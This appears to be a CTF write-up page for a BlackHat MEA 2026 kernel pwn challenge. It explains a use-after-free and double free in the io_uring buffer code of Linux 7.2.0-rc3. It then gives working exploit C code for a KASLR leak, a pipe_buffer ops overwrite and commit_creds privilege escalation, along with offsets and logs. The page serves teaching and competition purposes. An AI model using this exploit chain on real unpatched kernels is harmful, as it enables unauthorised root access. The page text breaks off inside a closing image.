@@ -1,0 +1,428 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-inline'; font-src 'self'; object-src 'none'; base-uri 'self'; form-action 'self' mailto:; upgrade-insecure-requests">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+<title>Bug Where · BlackHat MEA 2026 writeup</title>
+<meta name="description" content="Linux 7.2.0-rc3 ships an io_uring/kbuf.c bug where io_ring_buffers_peek() does kfree(arg-&gt;iovs) on the array it just filled instead of on the.">
+<link rel="canonical" href="https://www.usamaarshad.me/blog/blackhat-mea-2026-quals/bug-where/">
+<link rel="alternate" type="application/rss+xml" title="Usama Arshad, Writing" href="/feed.xml">
+<link rel="icon" href="/assets/favicon.ico">
+<link rel="apple-touch-icon" href="/assets/apple-touch-icon.png">
+<meta name="theme-color" content="#131110">
+<meta property="og:type" content="article">
+<meta property="og:site_name" content="Usama Arshad">
+<meta property="og:title" content="Bug Where · BlackHat MEA 2026 writeup">
+<meta property="og:description" content="Linux 7.2.0-rc3 ships an io_uring/kbuf.c bug where io_ring_buffers_peek() does kfree(arg-&gt;iovs) on the array it just filled instead of on the.">
+<meta property="og:url" content="https://www.usamaarshad.me/blog/blackhat-mea-2026-quals/bug-where/">
+<meta property="og:image" content="https://www.usamaarshad.me/assets/og.jpg">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:creator" content="@usama0x01">
+<meta name="twitter:title" content="Bug Where · BlackHat MEA 2026 writeup">
+<meta name="twitter:description" content="Linux 7.2.0-rc3 ships an io_uring/kbuf.c bug where io_ring_buffers_peek() does kfree(arg-&gt;iovs) on the array it just filled instead of on the.">
+<meta name="twitter:image" content="https://www.usamaarshad.me/assets/og.jpg">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "TechArticle",
+  "headline": "Bug Where: BlackHat MEA 2026 CTF writeup",
+  "description": "Linux 7.2.0-rc3 ships an io_uring/kbuf.c bug where io_ring_buffers_peek() does kfree(arg->iovs) on the array it just filled instead of on the.",
+  "datePublished": "2026-11-04",
+  "author": {
+    "@type": "Person",
+    "name": "Usama Arshad",
+    "url": "https://www.usamaarshad.me/"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://www.usamaarshad.me/blog/blackhat-mea-2026-quals/bug-where/"
+  },
+  "articleSection": "Pwn",
+  "proficiencyLevel": "Expert",
+  "isPartOf": {
+    "@type": "Article",
+    "name": "BlackHat MEA 2026 CTF qualifiers",
+    "url": "https://www.usamaarshad.me/blog/blackhat-mea-2026-quals/"
+  }
+}
+</script>
+<link rel="preload" href="/assets/fonts/fraunces-normal-340-640.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/fonts/inter-normal-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/fonts/jetbrainsmono-normal-400.woff2" as="font" type="font/woff2" crossorigin>
+<script>document.documentElement.classList.add("js");</script>
+<link rel="stylesheet" href="/assets/css/writeup.css">
+</head>
+<body>
+<div class="progress" id="prog" aria-hidden="true"></div>
+<a class="skip" href="#main">Skip to content</a>
+<header class="site-head" id="top">
+  <div class="container head-inner">
+    <a class="wordmark" href="/" aria-label="Usama Arshad, home">Usama Arshad<span class="dot">.</span></a>
+    <nav aria-label="Breadcrumb">
+      <a class="back-link" href="/blog/blackhat-mea-2026-quals/"><span class="arr" aria-hidden="true">←</span><span class="txt">All 15 challenges</span></a>
+    </nav>
+    <a class="btn btn-ghost head-cta" href="/assets/Usama-Arshad-Resume.pdf" download>Résumé</a>
+  </div>
+</header>
+
+<main id="main">
+  <section class="hero" aria-labelledby="pt">
+    <div class="container">
+      <div class="masthead" data-reveal>
+        <p class="masthead-meta">
+          <span>Challenge 8 of 15</span>
+          <span>Pwn</span>
+          <span class="live">Solved · 100 pts</span>
+        </p>
+      </div>
+      <div class="hero-deck">
+        <div class="deck-copy" data-reveal style="--d:.08s">
+          <p class="kicker">BlackHat MEA 2026 · Qualifiers</p>
+          <h1 class="hero-title" id="pt">Bug Where<span class="dot">.</span></h1>
+          <p class="deck">Use whatever you own.</p>
+          <p class="wu-meta">
+            <span class="cat cat-pwn">Pwn</span><span class="sep">·</span>
+            <span>100 points</span><span class="sep">·</span>
+            <span>4 November 2026</span>
+          </p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section class="section">
+    <div class="container">
+      <div class="wu-layout">
+        <article class="wu" data-reveal>
+          <div class="tldr"><p class="lab">TL;DR</p><p>Linux 7.2.0-rc3 ships an io_uring/kbuf.c bug where <code>io_ring_buffers_peek()</code> does kfree(arg-&gt;iovs) on the array it just filled instead of on the replaced array, while io_uring/net.c only refreshes kmsg-&gt;vec.iovec when a realloc actually happened, leaving a dangling iovec pointer parked in ctx-&gt;netmsg_cache. Reclaiming the freed chunk with a pipe_buffer[] and issuing a second bundled IORING_OP_SEND writes attacker-chosen (iov_base, iov_len) pairs directly over pipe_buffer[0].ops, so <code>close()</code> calls a userland pipe_buf_operations-&gt;release → commit_creds(prepare_kernel_cred(&amp;init_task)) → root, then read the flag off <code>/dev/sda.</code></p></div>
+          <div class="flagbox"><span class="lab">Captured</span><span class="flagval">BHFlagY{16cb5f9913feed7e2b3f4883f774d103}</span><button class="reveal-btn" type="button" aria-label="Reveal flag">Reveal</button></div><div class="flagbox"><span class="lab">Captured</span><span class="flagval">BHFlagY{a7025547abd6d77949f496500e8fef94}</span><button class="reveal-btn" type="button" aria-label="Reveal flag">Reveal</button></div><p class="flag-note">Instances are provisioned per run, so these are the values our instances returned.</p>
+          <section id="recon"><h2><span class="hn">01</span>Recon</h2><p class="codelabel">What was handed out</p>
+<p>bug-where.tar.gz → bzImage, initramfs.cpio.gz, kernel.config, qemu-hardening.patch, Dockerfile, <code>docker-compose.yml</code>, app-run, <code>hook.sh</code>. Remote is a pwn.red/jail container; each TCP connection spawns a fresh QEMU:</p>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">shell</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>qemu-system-x86_64 -m 128M -smp 2 -machine pc-i440fx-11.0,usb=off,vmport=off,acpi=on,smm=off \
+  -accel tcg,thread=single -global apic.vapic=off -nodefaults -no-user-config \
+  -display none -serial stdio -kernel /app/bzImage -initrd /app/initramfs.cpio.gz \
+  -append "console=ttyS0 quiet panic=-1 oops=panic kaslr" \
+  -drive "file=/tmp/flag.raw,format=raw,if=ide,index=1" -no-reboot -cpu qemu64 \
+  -sandbox on,obsolete=deny,elevateprivileges=deny,spawn=deny,resourcecontrol=deny</code></pre></figure>
+<p>The flag is dd'd into the first sector of a 1 MB raw disk (mode 0600) attached as the only IDE disk → guest <code>/dev/sda</code>, brw------- root root. So the objective is uid 0 inside the guest, nothing more exotic.</p>
+<p>init mounts proc/sysfs/devtmpfs + mqueue and exec s /drop_shell /bin/busybox sh -i. Disassembling drop_shell:main shows it loops prctl(PR_CAPBSET_DROP, i) for i = 0..<code>0x28</code>, then setgroups(0,NULL) and setres[gu]id(1337,1337,1337). Guest state confirmed by booting locally:</p>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">snippet</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>uid=1337 gid=1337     dmesg_restrict=1 kptr_restrict=0 perf_event_paranoid=2
+/proc/kallsyms -&gt; all zeros            klogctl: Operation not permitted
+CONFIG_USER_NS is not set              CONFIG_MEMCG is not set</code></pre></figure>
+<p class="codelabel">Kernel</p>
+<p>strings bzImage → Linux version 7.2.0-rc3-round100 (ptr@fast-pwn)... #2 SMP PREEMPT_DYNAMIC Wed Jul 15 14:27:33 JST 2026. gzip-compressed vmlinux extracted at file offset 21188.</p>
+<p>Notable config: RANDOMIZE_BASE, RANDOMIZE_MEMORY, STACKPROTECTOR_STRONG, RANDOMIZE_KSTACK_OFFSET, SLAB_FREELIST_RANDOM, SLAB_FREELIST_HARDENED, HARDENED_USERCOPY, X86_KERNEL_IBT, MITIGATION_PAGE_TABLE_ISOLATION, IO_URING=y, and crucially:</p>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">snippet</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>CONFIG_KMALLOC_PARTITION_CACHES=y
+CONFIG_KMALLOC_PARTITION_RANDOM=y</code></pre></figure>
+<p>Runtime CPU reality under -cpu qemu64 is far weaker than the config suggests, guest <code>/proc/cpuinfo</code> flags contain no smep, no smap, meltdown: Not affected (PTI inactive; oops banners read SMP NOPTI). That makes plain ret2usr viable.</p>
+<p class="codelabel">The QEMU patch is a gift, not a wall</p>
+<p>Most of qemu-hardening.patch removes devices/boards and plugs switch_tss / lcall / ljmp gate paths with raise_exception_err_ra(EXCP0D_GPF...). But it also re-implements 0F 18 /r (PREFETCH), which upstream decodes as a NOP:</p>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">c</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>[0x18] = X86_OP_ENTRY1(PREFETCH, M,b),
+...
+void helper_prefetch(CPUX86State *env, target_ulong addr)
+{
+    void *host; volatile unsigned delay = 0;
+    int mmu_idx = cpu_mmu_index_kernel(env);
+    (void)probe_access_flags(env, addr, 1, MMU_DATA_LOAD, mmu_idx, true, &amp;host, GETPC());
+    if (host) __builtin_prefetch(host, 0, 0);
+    else for (unsigned i = 0; i &lt; 256; i++) delay += i;
+}</code></pre></figure>
+<p>A ring-3 instruction probes the address with the kernel MMU index and burns 256 iterations on a miss. That is a deterministic, noise-free EntryBleed-style KASLR oracle handed to userland.</p>
+<p class="codelabel">Locating the bug ("Bug Where")</p>
+<p>The image is stock v7.2-rc3 plus one unrelated cpuset backport (mpol_rebind_mm(mm, &amp;cs- &gt;effective_mems)), so the target is an n-day fixed between rc3 and 7.2 final. Approach: intersect the set <code>of.c</code> files actually compiled into this config (3324, from the rc3 build tree's.o files) with the set of files that changed rc3→final (1900) → 241 candidates, then read the io_uring ones. io_uring/kbuf.c was the hit.</p>
+<p>Symbol offsets were recovered by rebuilding an initramfs with a root shell, booting the real bzImage with nokaslr, and dumping <code>/proc/kallsyms</code> (base <code>0xffffffff81000000</code>):</p>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">snippet</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>commit_creds          ffffffff812dcfd0    off=0x2dcfd0
+prepare_kernel_cred   ffffffff812dd280    off=0x2dd280
+init_task             ffffffff8300ca00    off=0x200ca00</code></pre></figure></section><section id="the-bug"><h2><span class="hn">02</span>The bug</h2><p class="codelabel">Root cause: <code>io_ring_buffers_peek()</code> frees the wrong array</p>
+<p class="codelabel">Vulnerable (7.2-rc3, io_uring/kbuf.c:331)</p>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">c</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>} while (--nr_iovs);
+
+if (arg-&gt;mode &amp; KBUF_MODE_FREE)
+        kfree(arg-&gt;iovs);           /* frees the array it JUST FILLED */</code></pre></figure>
+<p class="codelabel">Fixed (7.2 final)</p>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">c</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>if (arg-&gt;iovs != org_iovs &amp;&amp; (arg-&gt;mode &amp; KBUF_MODE_FREE))
+        kfree(org_iovs);           /* free the REPLACED array, and only then */</code></pre></figure>
+<p class="codelabel">Why the caller keeps the stale pointer</p>
+<p><code>io_send_select_buffer()</code> (io_uring/net.c:612..645) hands the cached vec back in and only writes it back when the pointer changed:</p>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">c</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>struct buf_sel_arg arg = { .iovs = &amp;kmsg-&gt;fast_iov, .max_len = min_not_zero(sr-&gt;len, INT_MAX),
+                           .nr_iovs = 1, .buf_group = sr-&gt;buf_group };
+if (kmsg-&gt;vec.iovec) {
+        arg.nr_iovs = kmsg-&gt;vec.nr;
+        arg.iovs    = kmsg-&gt;vec.iovec;
+        arg.mode    = KBUF_MODE_FREE;
+}
+if (!(sr-&gt;flags &amp; IORING_RECVSEND_BUNDLE)) arg.nr_iovs = 1;
+else                                       arg.mode |= KBUF_MODE_EXPAND;
+
+ret = io_buffers_select(req, &amp;arg, sel, issue_flags);
+...
+if (arg.iovs != &amp;kmsg-&gt;fast_iov &amp;&amp; arg.iovs != kmsg-&gt;vec.iovec) {
+        kmsg-&gt;vec.nr    = ret;
+        kmsg-&gt;vec.iovec = arg.iovs;       /* only refreshed on realloc */
+        req-&gt;flags |= REQ_F_NEED_CLEANUP;
+}</code></pre></figure>
+<p>When nr_avail &lt;= nr_iovs no realloc happens, so arg.iovs == kmsg-&gt;vec.iovec; the buggy kfree(arg- &gt;iovs) frees exactly the buffer kmsg-&gt;vec.iovec still points at, and the refresh is skipped. <code>io_netmsg_recycle()</code> (<code>net.c</code>:167) then parks that io_async_msghdr, dangling vec included, in ctx- &gt;netmsg_cache, because it only drops the vec when vec.nr &gt; IO_VEC_CACHE_SOFT_CAP and that cap is 256 while vec.nr is 64. The next IORING_OP_SEND on the same ring pulls it straight back out.</p>
+<p class="codelabel">Why one SQE frees it: bundle send is multishot</p>
+<p>IORING_OP_SEND | IORING_RECVSEND_BUNDLE re-enters via goto retry_bundle, so a single SQE runs multiple <code>io_ring_buffers_peek()</code> calls. With 128 published 16-byte entries and sqe-&gt;len = 1024:</p>
+<ul class="bullets"><li>peek #1: nr_avail = 1024/16 = 64 &gt; nr_iovs = 1 → kmalloc_objs(struct iovec, 64) = 1024 bytes, kmsg-&gt;vec.iovec set, bl-&gt;head 0 → 64. No KBUF_MODE_FREE yet, no free.</li><li>peek #2: arg.iovs = kmsg-&gt;vec.iovec, nr_iovs = 64, mode = FREE|EXPAND; nr_avail = 64 is not &gt; 64 → no realloc → fill in place → kfree(arg-&gt;iovs) fires on the still-cached pointer. head == tail == 128 sets REQ_F_BL_EMPTY and ends the bundle.</li></ul>
+<p class="codelabel">The primitive</p>
+<p>A later bundled send on that ring re-uses the cached msghdr and writes, into the freed chunk, one 16-byte (iov_base, iov_len) pair per published ring entry, fully attacker-controlled, at 16-byte stride, up to 64 entries, and then <code>kfree()</code> s the chunk again (a second free of memory that a live object now owns).</p>
+<p class="codelabel">The real obstacle: randomized kmalloc partitions</p>
+<p>CONFIG_KMALLOC_PARTITION_RANDOM creates 15 extra copies of each normal kmalloc cache (kmalloc- part-01-1k … kmalloc-part-15-1k) and picks one from _CODE_LOCATION_ XOR a per-boot random_kmalloc_seed:</p>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">snippet</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>#define KMALLOC_PARTITION_CACHES_NR     15
+#define __kmalloc_token(...) ((kmalloc_token_t){ .v = _CODE_LOCATION_ })
+#define _CODE_LOCATION_ ({ static const char __here; (unsigned long)&amp;__here; })</code></pre></figure>
+<p>Consequences, all verified by reading <code>/proc/slabinfo</code> from a root shell across boots:</p>
+<ul class="bullets"><li>Same call site ⇒ same partition, every time. Every allocation made from io_uring/kbuf.c:288 lands in the same cache, so the UAF, the write, and the re-own step are all deterministic.</li><li>Different call sites ⇒ independent 1/16 chance of colliding. pipe-&gt;bufs comes from fs/pipe.c (kzalloc_objs(struct pipe_buffer, pipe_bufs, GFP_KERNEL_ACCOUNT)), a different site. Measured collision rate: 4/50 boots ≈ 1/16.</li></ul>
+<ul class="bullets"><li>CONFIG_MEMCG is not set ⇒ KMALLOC_CGROUP == KMALLOC_NORMAL, so GFP_KERNEL_ACCOUNT still goes down the partitioned path rather than into a separate accounted cache.</li></ul>
+<p>Size classes line up: 64 iovecs = 1024 B, and PIPE_DEF_BUFFERS(16) * sizeof(struct pipe_buffer)(40) = 640 B, both the 1k class.</p>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">c</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>Why pipe_buffer is the perfect victim
+ struct pipe_buffer {          /* 40 bytes */
+         struct page *page;                         /* +0 */
+         unsigned int offset, len;                  /* +8, +12 */
+         const struct pipe_buf_operations *ops;     /* +16 */
+         unsigned int flags;                        /* +24 */
+         unsigned long private;                     /* +32 */
+ };</code></pre></figure>
+<p>iovec[1].iov_base sits at offset +16, exactly pipe_buffer[0].ops. And iovec[3].iov_base at +48 overlays pipe_buffer[1].offset /.len, giving a free read-back oracle through ioctl(FIONREAD).</p></section><section id="exploitation"><h2><span class="hn">03</span>Exploitation</h2><ol class="steps"><li>Break KASLR with the emulator's prefetch oracle. Probe 512 addresses at 2 MiB stride from <code>0xffffffff80000000</code>, taking the minimum RDTSC delta over 32 0F 18 /r executions per slot. Threshold at (min+max)/2; the first slot below it is the KASLR-slid _text. Derive commit_creds = kbase+<code>0x2dcfd0</code>, prepare_kernel_cred = kbase+<code>0x2dd280</code>, init_task = kbase+<code>0x200ca00</code>.</li><li>Set up. sched_setaffinity to CPU 0 (deterministic SLUB per-cpu freelist). mmap a fake pipe_buf_operations at fixed address <code>0x11000000</code> with all four function pointers (confirm, release, try_steal, get) set to a userland <code>payload()</code> that begins with endbr64 (IBT is configured on) and calls commit_creds(prepare_kernel_cred(init_task)). mmap a 64 KB scratch ubuf so <code>access_ok()</code> inside the peek loop always passes.</li><li>Create the dangling vec. io_uring_setup(32), socketpair(AF_UNIX, SOCK_DGRAM) with 2 MB SO_SNDBUF/SO_RCVBUF, IORING_REGISTER_PBUF_RING with 128 entries. Publish 128 entries of {addr = ubuf, len = 16} and submit one SQE: opcode = IORING_OP_SEND, flags = IOSQE_BUFFER_SELECT, ioprio = IORING_RECVSEND_BUNDLE, len = 1024, buf_group = bgid. The multishot bundle performs two peeks: the first kmallocs a 64-entry iovec array (1024 B) and caches it in kmsg-&gt;vec.iovec; the second fills it in place and hits kfree(arg-&gt;iovs). <code>io_netmsg_recycle()</code> parks the msghdr, dangling vec and all, in ctx-&gt;netmsg_cache. Drain the socket with recvfrom(MSG_DONTWAIT).</li><li>Reclaim with a pipe_buffer[]. pipe2(fds, O_DIRECT) allocates pipe-&gt;bufs (16 × 40 = 640 B, 1k class), with luck (1/16) from the same partition as the freed iovec array. Arm it: two 1-byte writes (packet mode ⇒ one pipe_buffer each) and one 1-byte read, so at least one slot holds a page and a live ops.</li><li>Write through the dangling vec. Publish 5 new ring entries on the same ring and submit another bundled IORING_OP_SEND with len = 65536:</li></ol>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">snippet</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>IDX       ADDR                             LEN    LANDS ON
+
+0         ubuf                             16     pipe_buffer[0].page / .offset,.len
+
+1         0x11000000 (fake ops)            16     pipe_buffer[0].ops
+
+2         0                                0      .private / next .page
+
+3         0x777 &lt;&lt; 32                      0      pipe_buffer[1].offset = 0 , .len = 0x777
+
+4         0                                0      padding</code></pre></figure>
+<p><code>io_send_select_buffer()</code> pulls the cached msghdr, sees kmsg-&gt;vec.iovec!= NULL, sets mode = FREE| EXPAND, nr_iovs = 64; nr_avail = 5 so no realloc, and the fill loop writes those five (base,len) pairs straight into the live pipe_buffer array, then <code>kfree()</code> s it again.</p>
+<ol class="steps" start="6"><li>Confirm the collision. ioctl(pipe_rd, FIONREAD) sums the live buffer lengths. Reading back 1911 (<code>0x777</code>) proves the freed chunk really is the pipe's pipe_buffer[] and that ops was overwritten. The exploit tries two victims per boot to double the odds to ~2/16: variant A a fresh pipe2(O_DIRECT) (allocated in alloc_pipe_info), variant B a pipe resized with fcntl(fd, F_SETPIPE_SZ /1031/, 65536), which re-allocates pipe-&gt;bufs from a different call site (pipe_resize_ring, fs/ <code>pipe.c</code>:1398) and therefore rolls an independent partition. On a miss, print MISS and exit so the boot can be retried.</li><li>Neutralise the double free. The chunk is now on the freelist while the pipe still owns it, <code>close()</code> would <code>kfree()</code> it a third time and trip SLAB_FREELIST_HARDENED. Fix: open a third io_uring ring and issue a 64-entry bundled send with no cached vec, so peek #1 takes the KBUF_MODE_EXPAND path and kmallocs 1024 B from the same io_uring/kbuf.c call site ⇒ the same partition, re-owning the chunk. The 64 published entries re-stamp ops = fake_ops and set the oracle field to <code>0x555</code>; FIONREAD == 1365 confirms the chunk is re-owned and still overlaps the pipe.</li><li>Fire. close(pipe_rd); close(pipe_wr) → <code>free_pipe_info()</code> → <code>pipe_buf_release()</code> → ops- &gt;release(pipe, buf) → userland <code>payload()</code> (no SMEP/SMAP/PTI on -cpu qemu64) → commit_creds(prepare_kernel_cred(&amp;init_task)). Back in userland <code>getuid()</code> returns 0.</li><li>Read the flag. open("<code>/dev/sda</code>", O_RDONLY), <code>read()</code> 511 bytes of sector 0, print.</li></ol>
+<p class="codelabel">Delivery to the remote</p>
+<p>The guest has no network, so the binary has to be pasted over the serial console, and every connection is a fresh boot, i.e. a fresh 1/16 roll, so it has to be re-pasted on each attempt. A gcc -static -Os -s glibc build was 690 KB → 406 KB of base64, far too slow to retry. It was ported to raw syscall stubs and built -nostdlib -static -Os -fno-stack-protector -fno-asynchronous-unwind-tables: 9 KB → 3176 bytes of gzip+base64.</p>
+<p><code>remote_drive.py</code> then, per attempt: connect, readuntil(b"~ $", 55s), cd <code>/tmp</code>, upload in 7 lines of echo -n '&lt;512 b64 chars&gt;' &gt;&gt; b, base64 -d &lt; b | gunzip &gt; x; chmod +x x; echo UPOK, run./x, and classify on FLAG: / MISS / NOROOT. Workers were run 4-way in parallel since each connection gets its own VM.</p></section><section id="results"><h2><span class="hn">04</span>Results</h2><p>Local (patched QEMU + real bzImage / initramfs, per-boot private flag disks): 2 flags in 15 boots ≈ 13%, matching the predicted 2/16.</p>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">snippet</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>[*] start uid=1337
+[+] kbase=0xffffffff87c00000
+[*] A=1911            &lt;- 0x777 oracle: chunk overlaps pipe_buffer
+HIT A
+[*] reclaim=1365      &lt;- 0x555: chunk re-owned, close() will survive
+[*] closing
+[*] pwned=1
+[*] uid=0
+[+] FLAG: BHFlagY{16cb5f9913feed7e2b3f4883f774d103}</code></pre></figure>
+<ul class="bullets"><li>tcp.flagyard.com:24301, landed on the first attempt (variant A) → BHFlagY{16cb5f9913feed7e2b3f4883f774d103}</li><li>tcp.flagyard.com:25414, 9 connections (5 boot flakes, 4 reached a shell), attempt 5 hit variant B with kbase=<code>0xffffffff93a00000</code> → BHFlagY{a7025547abd6d77949f496500e8fef94}</li></ul>
+<p>Key code /* <code>MINI.c</code>, core of the chain (nolibc; 9 KB static, 3176 B gzip+base64) * 425=io_uring_setup 426=io_uring_enter 427=io_uring_register * 53=socketpair 293=pipe2 72=fcntl 16=ioctl 45=recvfrom 3=close 2=open 0=read */ #define NENT 128 #define SIG1 0x0777UL #define SIG2 0x0555UL</p>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">c</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>/* one bundled SEND on the provided-buffer ring */
+static int csend(struct ctx*c,u32 len){
+    struct io_uring_sqe*s=&amp;c-&gt;r.sqes[(*c-&gt;r.sqt)&amp;(*c-&gt;r.sqm)];
+    mset(s,0,sizeof *s);
+    s-&gt;opcode=IORING_OP_SEND; s-&gt;fd=c-&gt;sk[0]; s-&gt;flags=IOSQE_BUFFER_SELECT;
+    s-&gt;ioprio=IORING_RECVSEND_BUNDLE; s-&gt;len=len; s-&gt;buf_group=c-&gt;bgid;
+    __atomic_store_n(c-&gt;r.sqt,*c-&gt;r.sqt+1,__ATOMIC_RELEASE);
+    SYS4(426,c-&gt;r.fd,1,1,IORING_ENTER_GETEVENTS);
+    /* ... reap CQE, then drain the socketpair with MSG_DONTWAIT ... */
+}
+
+/* step 1: 128 x 16B entries + len=1024 -&gt; multishot bundle does two peeks:
+ *   peek#1 kmalloc(64 iovec = 1024B) and caches it in kmsg-&gt;vec.iovec
+ *   peek#2 no realloc -&gt; buggy kfree(arg-&gt;iovs) -&gt; vec.iovec dangles
+ *   io_netmsg_recycle() parks the msghdr in ctx-&gt;netmsg_cache            */
+static void make_dangling(struct ctx*c){
+    for(int i=0;i&lt;NENT;i++) badd(c,(u64)ubuf,16);
+    bpub(c); csend(c,1024);
+}
+
+/* step 2: write (iov_base,iov_len) pairs into the freed chunk, which a
+ * pipe_buffer[16] now occupies. entry 1 -&gt; +16 == pipe_buffer[0].ops,
+ * entry 3 -&gt; +48 == pipe_buffer[1].{offset,len} (FIONREAD oracle)          */
+static void corrupt(struct ctx*c,u64 ops,u64 sig){
+    badd(c,(u64)ubuf,16); badd(c,ops,ops?16:0);
+    badd(c,0,0);          badd(c,sig&lt;&lt;32,0); badd(c,0,0);
+    bpub(c); csend(c,65536);
+}
+
+/* step 3: fresh ring, no cached vec -&gt; KBUF_MODE_EXPAND kmallocs 1024B from
+ * the SAME io_uring/kbuf.c call site == SAME random partition, re-owning the
+ * double-freed chunk so close() does not corrupt the freelist               */
+static void reclaim_keep(struct ctx*c,u64 ops,u64 sig){
+    badd(c,(u64)ubuf,16); badd(c,ops,16); badd(c,0,0); badd(c,sig&lt;&lt;32,0);
+    for(int i=4;i&lt;64;i++) badd(c,0,0);
+    bpub(c); csend(c,65536);
+}
+
+__attribute__((used)) static void payload(void*p,void*b){(void)p;(void)b;
+    __asm__ __volatile__("endbr64");
+    cc_fn(pkc_fn((void*)it_addr)); pwned=1;   /* commit_creds(prepare_kernel_cred(init_task)) */
+}
+
+void _start(void){
+    static u64 mask=1; SYS3(203,0,8,&amp;mask);          /* pin to CPU0 */
+    u64 kb=leak();                                    /* 0f 18 /r prefetch oracle */
+    cc_fn=(void*)(kb+0x2dcfd0); pkc_fn=(void*)(kb+0x2dd280); it_addr=kb+0x200ca00;
+
+    fops=mmap_((void*)0x11000000,0x2000,7,0x32,-1,0);
+    fops-&gt;confirm=fops-&gt;release=fops-&gt;try_steal=fops-&gt;get=(void*)payload;
+    ubuf=mmap_(0,0x10000,3,0x22,-1,0); mset(ubuf,'A',0x10000);
+
+    int pb[2],pa[2]; SYS2(293,pb,0x4000);             /* pipe2(O_DIRECT) */
+    static struct ctx c1,c2,c3; int*win=0;
+
+    cinit(&amp;c1,1); make_dangling(&amp;c1);
+    SYS2(293,pa,0x4000); pipe_arm(pa);                /* variant A: alloc_pipe_info */
+    corrupt(&amp;c1,(u64)fops,SIG1);
+    if(fionread(pa[0])==(int)SIG1){win=pa;outs("HIT A\n");}
+
+    if(!win){                                          /* variant B: pipe_resize_ring */
+
+          cinit(&amp;c2,2); make_dangling(&amp;c2);
+          SYS3(72,pb[1],1031,16*4096);                   /* F_SETPIPE_SZ */
+          pipe_arm(pb); corrupt(&amp;c2,(u64)fops,SIG1);
+          if(fionread(pb[0])==(int)SIG1){win=pb;outs("HIT B\n");}
+      }
+      if(!win){outs("MISS\n");SYS1(231,1);}              /* lost the 1/16 roll -&gt; retry boot */
+
+      cinit(&amp;c3,3); reclaim_keep(&amp;c3,(u64)fops,SIG2);    /* expect FIONREAD == 0x555 */
+      SYS1(3,win[0]); SYS1(3,win[1]);                     /* free_pipe_info -&gt; ops-&gt;release */
+
+      if(SYS0(102)==0){                                  /* getuid() == 0 */
+          int fd=(int)SYS3(2,"/dev/sda",0,0);
+          static char b[512]; long n=SYS3(0,fd,b,511);
+          outs("[+] FLAG: "); wr(1,b,n);
+      }
+}</code></pre></figure><figure class="meme"><div class="meme-card"><p class="meme-cap top">WORKED FIRST TRY ON THE REMOTE</p><svg viewBox="0 0 560 170" role="img" xmlns="http://www.w3.org/2000/svg">
+<rect width="560" height="170" fill="#100e0d"/>
+<text x="280" y="42" fill="#6f6659" font-family="monospace" font-size="11" text-anchor="middle" letter-spacing="2">EXPLOIT RELIABILITY</text>
+<rect x="70" y="68" width="420" height="22" fill="none" stroke="#d6cfc3" stroke-width="1.5"/>
+<rect x="72" y="70" width="400" height="18" fill="#e5484d" opacity=".85"/>
+<rect x="472" y="70" width="18" height="18" fill="none"/>
+<text x="280" y="124" fill="#e5484d" font-family="monospace" font-size="22" text-anchor="middle" letter-spacing="3">99%</text>
+<text x="280" y="146" fill="#6f6659" font-family="monospace" font-size="10" text-anchor="middle" letter-spacing="2">LOCALLY. REMOTE IS A DIFFERENT STORY.</text>
